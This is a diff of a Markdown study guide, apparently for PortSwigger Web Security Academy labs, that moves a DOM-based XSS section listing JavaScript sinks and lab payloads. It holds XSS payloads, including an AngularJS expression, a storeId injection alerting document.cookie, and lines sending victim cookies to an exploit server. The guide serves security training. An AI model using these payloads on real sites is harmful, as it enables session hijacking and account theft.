@@ -32,13 +32,62 @@
 [Youtube Study Playlist](#youtube-training-playlist)  
 
 # Foothold  
+  
+## DOM-Based XSS  
 
+>DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. In the target source code look out for the following **sinks**:  
 
-## DOM XSS Messages  
+* document.write
+* window.location
+* document.cookie
+* eval()
+* document.domain
+* WebSocket
+* element.src
+* postmessage
+* setRequestHeader
+* JSON.parse
+* ng-app
+* URLSearchParams
+* replace()
+* innerHTML
+* location.search
+* addEventListener  
+  
+>AngularJS expression in the search box when angle brackets and double quotes HTML-encoded.  
+
+```JavaScript
+{{$on.constructor('alert(1)')()}}
+```  
+
+![domxss-on-constructor.png](images/domxss-on-constructor.png)  
+
+[PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)  
+
+>Below the target is vulnerable to dom-xss in the stock check function. Document.write is the sink used with location.search allowing us to add new value to Javascript variable **storeId**.  
+
+```html
+/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(document.cookie)>  
+```  
+
+![get-dom-xss.png](images/get-dom-xss.png)  
+
+>Dom-based XSS request with inserted malicious code into the variable read by the target JavaScript.  
+
+![dom-xss](images/dom-xss.png)  
+
+[PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
+
+### Dom Invader  
+
+>Using Dom Invader plugin and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  
+
+![DOM Invader](images/dom-invader.png)  
+
+### DOM XSS JSON.parse web messages    
 
 >Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
 
-### DOM XSS Exploitation JSON.parse web messages  
 
 >The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
 
@@ -310,6 +359,8 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://
 <video src="https://EXPLOIT.net/video"></video>
 ```  
   
+>Below is log of requests to exploit log server showing which of the above tags worked.  
+
 ![Identify-stored-xss](images/identify-stored-xss.png)  
 
 >Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  
@@ -349,57 +400,7 @@ body:document.cookie
 ```  
 
 [PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
-
-### DOM-Based XSS  
-
->DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. In the target source code look out for the following **sinks**:  
-
-* document.write
-* window.location
-* document.cookie
-* eval()
-* document.domain
-* WebSocket
-* element.src
-* postmessage
-* setRequestHeader
-* JSON.parse
-* ng-app
-* URLSearchParams
-* replace()
-* innerHTML
-* location.search
-* addEventListener  
   
->AngularJS expression in the search box when angle brackets and double quotes HTML-encoded.  
-
-```JavaScript
-{{$on.constructor('alert(1)')()}}
-```  
-
-![domxss-on-constructor.png](images/domxss-on-constructor.png)  
-
-[PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)  
-
->Below the target is vulnerable to dom-xss in the stock check function. Document.write is the sink used with location.search allowing us to add new value to Javascript variable **storeId**.  
-
-```html
-/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(document.cookie)>  
-```  
-
-![get-dom-xss.png](images/get-dom-xss.png)  
-
->Dom-based XSS request with inserted malicious code into the variable read by the target JavaScript.  
-
-![dom-xss](images/dom-xss.png)  
-
-[PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
-
-#### Dom Invader  
-
->Using Dom Invader plugin and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  
-
-![DOM Invader](images/dom-invader.png)  
 
 ## Host Header Poison - forgot-password
 
